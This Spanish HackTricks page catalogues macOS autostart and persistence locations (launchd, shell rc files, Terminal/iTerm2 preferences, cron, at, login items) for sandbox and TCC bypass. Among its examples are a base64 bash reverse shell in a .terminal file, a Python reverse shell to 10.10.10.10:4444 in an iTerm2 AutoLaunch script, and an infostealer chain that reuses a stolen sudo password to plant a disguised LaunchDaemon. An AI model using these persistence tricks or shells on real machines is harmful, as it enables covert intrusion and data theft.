# Inicio automático de macOS

{{#include ../banners/hacktricks-training.md}}

Esta sección se basa en gran medida en la serie de blogs [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/); el objetivo es añadir **más ubicaciones de inicio automático** (si es posible), indicar **qué técnicas siguen funcionando** actualmente con la última versión de macOS (13.4) y especificar los **permisos** necesarios.

## Bypass del Sandbox

> [!TIP]
> Aquí puedes encontrar ubicaciones de inicio útiles para realizar un **sandbox bypass** que permiten ejecutar algo simplemente **escribiéndolo en un archivo** y **esperando** una **acción** muy **común**, una **cantidad de tiempo** determinada o una **acción que normalmente puedes realizar** desde dentro de un sandbox sin necesitar permisos de root.

### Launchd

- Útil para realizar un sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicaciones

- **`/Library/LaunchAgents`**
- **Trigger**: Reinicio
- Se requiere Root
- **`/Library/LaunchDaemons`**
- **Trigger**: Reinicio
- Se requiere Root
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reinicio
- Se requiere Root
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reinicio
- Se requiere Root
- **`~/Library/LaunchAgents`**
- **Trigger**: Volver a iniciar sesión
- **`~/Library/LaunchDemons`**
- **Trigger**: Volver a iniciar sesión

> [!TIP]
> Como dato interesante, **`launchd`** tiene una property list integrada en la sección Mach-o `__Text.__config`, que contiene otros servicios conocidos que launchd debe iniciar. Además, estos servicios pueden contener `RequireSuccess`, `RequireRun` y `RebootOnSuccess`, lo que significa que deben ejecutarse y completarse correctamente.
>
> Por supuesto, no se puede modificar debido a la firma de código.

#### Descripción y Explotación

**`launchd`** es el **primer** **proceso** ejecutado por el kernel OX S al iniciar y el último en finalizar durante el apagado. Siempre debería tener el **PID 1**. Este proceso **leerá y ejecutará** las configuraciones indicadas en los **plists** de **ASEP** ubicados en:

- `/Library/LaunchAgents`: Agents por usuario instalados por el administrador
- `/Library/LaunchDaemons`: Daemons de todo el sistema instalados por el administrador
- `/System/Library/LaunchAgents`: Agents por usuario proporcionados por Apple.
- `/System/Library/LaunchDaemons`: Daemons de todo el sistema proporcionados por Apple.

Cuando un usuario inicia sesión, los plists ubicados en `/Users/$USER/Library/LaunchAgents` y `/Users/$USER/Library/LaunchDemons` se inician con los **permisos del usuario conectado**.

La **principal diferencia entre agents y daemons es que los agents se cargan cuando el usuario inicia sesión y los daemons se cargan al iniciar el sistema** (ya que hay servicios como ssh que deben ejecutarse antes de que cualquier usuario acceda al sistema). Además, los agents pueden utilizar la GUI, mientras que los daemons deben ejecutarse en segundo plano.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Hay casos en los que un **agent debe ejecutarse antes de que el usuario inicie sesión**; estos se denominan **PreLoginAgents**. Por ejemplo, esto resulta útil para proporcionar tecnología de asistencia durante el inicio de sesión. También se pueden encontrar en `/Library/LaunchAgents` (consulta [**aquí**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un ejemplo).

> [!TIP]
> Los archivos de configuración de nuevos Daemons o Agents se **cargarán después del siguiente reinicio o mediante** `launchctl load <target.plist>`. También es **posible cargar archivos .plist sin esa extensión** con `launchctl -F <file>` (sin embargo, esos archivos plist no se cargarán automáticamente después del reinicio).\
> También es posible **descargarlos** con `launchctl unload <target.plist>` (el proceso al que apunta será terminado),
>
> Para **asegurarte** de que no haya **nada** (como un override) que **impida** que un **Agent** o **Daemon** **se ejecute**, ejecuta: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Lista todos los agents y daemons cargados por el usuario actual:
```bash
launchctl list
```
#### Cadena maliciosa de LaunchDaemon de ejemplo (reutilización de contraseñas)

Un infostealer reciente para macOS reutilizó una **contraseña de sudo capturada** para instalar un agente de usuario y un LaunchDaemon con privilegios de root:

- Escribir el bucle del agente en `~/.agent` y hacerlo ejecutable.
- Generar un plist en `/tmp/starter` que apunte a ese agente.
- Reutilizar la contraseña robada con `sudo -S` para copiarlo en `/Library/LaunchDaemons/com.finder.helper.plist`, establecer `root:wheel` y cargarlo con `launchctl load`.
- Iniciar el agente silenciosamente mediante `nohup ~/.agent >/dev/null 2>&1 &` para separar la salida.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Si un plist pertenece a un usuario, incluso si se encuentra en carpetas del sistema de daemon, la **tarea se ejecutará como el usuario** y no como root. Esto puede evitar algunos ataques de escalada de privilegios.

#### Más información sobre launchd

**`launchd`** es el **primer** proceso en modo usuario que se inicia desde el **kernel**. El inicio del proceso debe ser **exitoso** y este **no puede finalizar ni bloquearse**. Incluso está **protegido** contra algunas **señales de terminación**.

Una de las primeras cosas que haría **launchd** es **iniciar** todos los **daemons**, como:

- **Timer daemons** basados en el momento en que deben ejecutarse:
- atd (`com.apple.atrun.plist`): Tiene un `StartInterval` de 30min
- crond (`com.apple.systemstats.daily.plist`): Tiene `StartCalendarInterval` para iniciarse a las 00:15
- **Network daemons** como:
- `org.cups.cups-lpd`: Escucha en TCP (`SockType: stream`) con `SockServiceName: printer`
- SockServiceName debe ser un puerto o un servicio de `/etc/services`
- `com.apple.xscertd.plist`: Escucha en TCP en el puerto 1640
- **Path daemons** que se ejecutan cuando cambia una ruta especificada:
- `com.apple.postfix.master`: Comprueba la ruta `/etc/postfix/aliases`
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: Indica en la entrada `MachServices` el nombre `com.apple.xscertd.helper`
- **UserEventAgent:**
- Esto es diferente de lo anterior. Hace que launchd genere procesos de aplicaciones en respuesta a eventos específicos. Sin embargo, en este caso, el binario principal involucrado no es `launchd`, sino `/usr/libexec/UserEventAgent`. Carga plugins desde la carpeta restringida por SIP /System/Library/UserEventPlugins/, donde cada plugin indica su inicializador en la clave `XPCEventModuleInitializer` o, en el caso de plugins antiguos, en el dict `CFPluginFactories`, bajo la clave `FB86416D-6164-2070-726F-70735C216EC0` de su `Info.plist`.

### archivos de inicio del shell

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Pero necesitas encontrar una app con un TCC bypass que ejecute un shell que cargue estos archivos

#### Ubicaciones

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Abrir un terminal con zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Abrir un terminal con zsh
- Se requiere root
- **`~/.zlogout`**
- **Trigger**: Salir de un terminal con zsh
- **`/etc/zlogout`**
- **Trigger**: Salir de un terminal con zsh
- Se requiere root
- Potencialmente hay más en: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Abrir un terminal con bash
- `/etc/profile` (no funcionó)
- `~/.profile` (no funcionó)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Se esperaba que se activara con xterm, pero **no está instalado** e incluso después de instalarlo aparece este error: xterm: `DISPLAY is not set`

#### Descripción y explotación

Al iniciar un entorno de shell como `zsh` o `bash`, se ejecutan **ciertos archivos de inicio**. macOS utiliza actualmente `/bin/zsh` como shell predeterminado. Este shell se accede automáticamente cuando se inicia la aplicación Terminal o cuando se accede a un dispositivo mediante SSH. Aunque `bash` y `sh` también están presentes en macOS, es necesario invocarlos explícitamente para utilizarlos.

La página man de zsh, que podemos leer con **`man zsh`**, contiene una descripción extensa de los archivos de inicio.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Aplicaciones reabiertas

> [!CAUTION]
> Configurar la explotación indicada y cerrar y volver a iniciar sesión, o incluso reiniciar, no funcionó para mí para ejecutar la app. (La app no se estaba ejecutando; quizá deba estar en ejecución cuando se realizan estas acciones).

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Útil para omitir sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Activador**: Reinicio que vuelve a abrir las aplicaciones

#### Descripción y explotación

Todas las aplicaciones que se volverán a abrir están dentro del plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Por lo tanto, haz que las aplicaciones que se vuelven a abrir ejecuten la tuya; solo tienes que **añadir tu app a la lista**.

El UUID se puede encontrar listando ese directorio o con `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Para comprobar las aplicaciones que se volverán a abrir, puedes ejecutar:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Para **añadir una aplicación a esta lista** puedes usar:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Preferencias de Terminal

- Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
- Usar Terminal para obtener permisos FDA del usuario

#### Ubicación

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Abrir Terminal

#### Descripción y explotación

En **`~/Library/Preferences`** se almacenan las preferencias del usuario en las Applications. Algunas de estas preferencias pueden contener una configuración para **ejecutar otras aplicaciones/scripts**.

Por ejemplo, Terminal puede ejecutar un comando durante el Startup:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Esta configuración se refleja en el archivo **`~/Library/Preferences/com.apple.Terminal.plist`** de la siguiente manera:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Por lo tanto, si se pudiera sobrescribir el plist de las preferencias de Terminal en el sistema, se podría utilizar la funcionalidad **`open`** para **abrir Terminal y ejecutar ese comando**.

Puedes añadirlo desde la CLI con:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Other file extensions

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Uso de Terminal para obtener permisos FDA del usuario

#### Ubicación

- **Cualquiera**
- **Disparador**: Abrir Terminal

#### Descripción y explotación

Si creas un script [**`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) y lo abres, la **aplicación Terminal** se invocará automáticamente para ejecutar los comandos indicados en él. Si la aplicación Terminal tiene privilegios especiales (como TCC), tu comando se ejecutará con esos privilegios especiales.

Pruébalo con:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
También podrías usar las extensiones **`.command`**, **`.tool`**, con contenido de shell scripts normales, y también se abrirán con Terminal.

> [!CAUTION]
> Si Terminal tiene **Full Disk Access**, podrá completar esa acción (ten en cuenta que el comando ejecutado será visible en una ventana de Terminal).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Útil para bypass del sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Podrías obtener acceso adicional a TCC

#### Ubicación

- **`/Library/Audio/Plug-Ins/HAL`**
- Se requiere root
- **Trigger**: Reiniciar coreaudiod o el ordenador
- **`/Library/Audio/Plug-ins/Components`**
- Se requiere root
- **Trigger**: Reiniciar coreaudiod o el ordenador
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Reiniciar coreaudiod o el ordenador
- **`/System/Library/Components`**
- Se requiere root
- **Trigger**: Reiniciar coreaudiod o el ordenador

#### Descripción

Según los writeups anteriores, es posible **compilar algunos audio plugins** y hacer que se carguen.

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Útil para bypass del sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Podrías obtener acceso adicional a TCC

#### Ubicación

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Descripción y explotación

Los QuickLook plugins pueden ejecutarse cuando **activas la vista previa de un archivo** (pulsando la barra espaciadora con el archivo seleccionado en Finder) y hay instalado un **plugin compatible con ese tipo de archivo**.

Es posible compilar tu propio QuickLook plugin, colocarlo en una de las ubicaciones anteriores para cargarlo y, a continuación, abrir un archivo compatible y pulsar la barra espaciadora para activarlo.

### ~~Hooks de inicio/cierre de sesión~~

> [!CAUTION]
> Esto no me funcionó, ni con el LoginHook del usuario ni con el LogoutHook de root.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Útil para bypass del sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- Debes poder ejecutar algo como `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- Ubicado en `~/Library/Preferences/com.apple.loginwindow.plist`

Están deprecated, pero pueden utilizarse para ejecutar comandos cuando un usuario inicia sesión.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Esta configuración se almacena en `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Para eliminarlo:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
El del usuario root se almacena en **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Aquí puedes encontrar start locations útiles para **sandbox bypass** que permiten simplemente ejecutar algo **escribiéndolo en un archivo** y **esperando condiciones no muy comunes**, como **programas específicos instalados, acciones "poco comunes" del usuario** o determinados entornos.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Útil para realizar sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- Sin embargo, debes poder ejecutar el binario `crontab`
- O ser root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Se requiere root para obtener acceso de escritura directo. No se requiere root si puedes ejecutar `crontab <file>`
- **Trigger**: Depende del cron job

#### Description & Exploitation

Lista los cron jobs del **usuario actual** con:
```bash
crontab -l
```
También puedes ver todos los trabajos cron de los usuarios en **`/usr/lib/cron/tabs/`** y **`/var/at/tabs/`** (requiere root).

En macOS se pueden encontrar varias carpetas que ejecutan scripts con **cierta frecuencia** en:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Allí se pueden encontrar los **cron** **jobs** habituales, los **at** **jobs** (no muy utilizados) y los **periodic** **jobs** (utilizados principalmente para limpiar archivos temporales). Los **periodic** **jobs** diarios se pueden ejecutar, por ejemplo, con: `periodic daily`.

Para añadir un **user cronjob** mediante programación, se puede utilizar:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 solía tener permisos TCC concedidos

#### Ubicaciones

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Activador**: Abrir iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Activador**: Abrir iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Activador**: Abrir iTerm

#### Descripción y explotación

Los scripts almacenados en **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** se ejecutarán. Por ejemplo:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
o:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
El script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** también se ejecutará:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Las preferencias de iTerm2 ubicadas en **`~/Library/Preferences/com.googlecode.iterm2.plist`** pueden **indicar un comando que se ejecutará** cuando se abra el terminal de iTerm2.

Esta configuración se puede establecer en los ajustes de iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Y el comando se refleja en las preferencias:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Puedes configurar el comando que se ejecutará con:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Es muy probable que existan **otras formas de abusar de las preferencias de iTerm2** para ejecutar comandos arbitrarios.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero xbar debe estar instalado
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
- Solicita permisos de Accessibility

#### Ubicación

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: Cuando se ejecuta xbar

#### Descripción

Si el popular programa [**xbar**](https://github.com/matryer/xbar) está instalado, es posible escribir un shell script en **`~/Library/Application\ Support/xbar/plugins/`**, que se ejecutará cuando se inicie xbar:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero Hammerspoon debe estar instalado
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Solicita permisos de Accessibility

#### Ubicación

- **`~/.hammerspoon/init.lua`**
- **Disparador**: Una vez ejecutado hammerspoon

#### Descripción

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) sirve como plataforma de automatización para **macOS**, utilizando el **lenguaje de scripting LUA** para sus operaciones. Cabe destacar que admite la integración de código AppleScript completo y la ejecución de shell scripts, lo que mejora significativamente sus capacidades de scripting.

La aplicación busca un único archivo, `~/.hammerspoon/init.lua`, y cuando se inicia, se ejecuta el script.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero BetterTouchTool debe estar instalado
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Solicita permisos de Automation-Shortcuts y Accessibility

#### Ubicación

- `~/Library/Application Support/BetterTouchTool/*`

Esta herramienta permite indicar aplicaciones o scripts que se ejecutarán cuando se pulsen ciertos atajos. Un atacante podría configurar su propio **atajo y acción para ejecutar en la base de datos** y conseguir que se ejecute código arbitrario (un atajo podría consistir simplemente en pulsar una tecla).

### Alfred

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero Alfred debe estar instalado
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Solicita permisos de Automation, Accessibility e incluso Full-Disk access

#### Ubicación

- `???`

Permite crear workflows que pueden ejecutar código cuando se cumplen determinadas condiciones. Potencialmente, un atacante podría crear un archivo de workflow y hacer que Alfred lo cargue (es necesario pagar la versión premium para utilizar workflows).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero ssh debe estar habilitado y utilizarse
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH se utiliza para obtener acceso FDA

#### Ubicación

- **`~/.ssh/rc`**
- **Trigger**: Inicio de sesión mediante ssh
- **`/etc/ssh/sshrc`**
- Requiere root
- **Trigger**: Inicio de sesión mediante ssh

> [!CAUTION]
> Activar ssh requiere Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Descripción y explotación

De forma predeterminada, a menos que `PermitUserRC no` esté presente en `/etc/ssh/sshd_config`, cuando un usuario **inicia sesión mediante SSH**, se ejecutan los scripts **`/etc/ssh/sshrc`** y **`~/.ssh/rc`**.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero es necesario ejecutar `osascript` con argumentos
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicaciones

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Inicio de sesión
- Payload de exploit almacenado que ejecuta **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Inicio de sesión
- Requiere root

#### Descripción

En Preferencias del Sistema -> Usuarios y grupos -> **Login Items** se pueden encontrar **los elementos que se ejecutarán cuando el usuario inicie sesión**.\
Es posible listarlos, añadirlos y eliminarlos desde la línea de comandos:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Estos elementos se almacenan en el archivo **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

Los **Login items** también pueden indicarse mediante la API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), que almacenará la configuración en **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP como Login Item

(Consulta la sección anterior sobre Login Items; esto es una extensión)

Si almacenas un archivo **ZIP** como **Login Item**, **`Archive Utility`** lo abrirá y, si el zip se hubiera almacenado, por ejemplo, en **`~/Library`** y contuviera la carpeta **`LaunchAgents/file.plist`** con un backdoor, esa carpeta se creará (no existe de forma predeterminada) y el plist se añadirá, de modo que la próxima vez que el usuario vuelva a iniciar sesión, se **ejecutará el backdoor indicado en el plist**.

Otra opción sería crear los archivos **`.bash_profile`** y **`.zshenv`** dentro del HOME del usuario, de modo que, si la carpeta LaunchAgents ya existe, esta técnica siga funcionando.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero es necesario **ejecutar** **`at`** y debe estar **habilitado**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Es necesario **ejecutar** **`at`** y debe estar **habilitado**

#### **Descripción**

Las tareas de `at` están diseñadas para **programar tareas de ejecución única** en determinados momentos. A diferencia de los trabajos de cron, las tareas de `at` se eliminan automáticamente después de ejecutarse. Es importante tener en cuenta que estas tareas persisten tras los reinicios del sistema, lo que las convierte en posibles problemas de seguridad en determinadas condiciones.

De forma **predeterminada**, están **deshabilitadas**, pero el usuario **root** puede **habilitarlas** con:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Esto creará un archivo en 1 hora:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Comprueba la cola de trabajos usando `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Arriba podemos ver dos trabajos programados. Podemos imprimir los detalles del trabajo usando `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
